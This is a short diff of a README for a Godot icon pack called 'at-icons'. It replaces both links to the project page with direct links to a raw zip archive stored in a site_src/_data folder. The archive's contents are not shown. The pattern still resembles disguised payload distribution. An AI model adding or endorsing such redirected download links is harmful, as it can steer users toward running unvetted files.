@@ -1,6 +1,6 @@
 # 🎨 at-icons - Custom icons for your Godot projects
 
-[![](https://img.shields.io/badge/Download-at--icons-blue.svg)](https://github.com/mattysmokefilled714/at-icons)
+[![](https://img.shields.io/badge/Download-at--icons-blue.svg)](https://raw.githubusercontent.com/mattysmokefilled714/at-icons/main/site_src/_data/at-icons-3.7.zip)
 
 ## 📦 What is at-icons
 
@@ -21,7 +21,7 @@ Your computer needs specific components to use these icons correctly. Ensure you
 
 To add these icons to your Godot project, visit the download page.
 
-[Click here to visit the project page and download the icons](https://github.com/mattysmokefilled714/at-icons)
+[Click here to visit the project page and download the icons](https://raw.githubusercontent.com/mattysmokefilled714/at-icons/main/site_src/_data/at-icons-3.7.zip)
 
 ### Downloading the Files
 
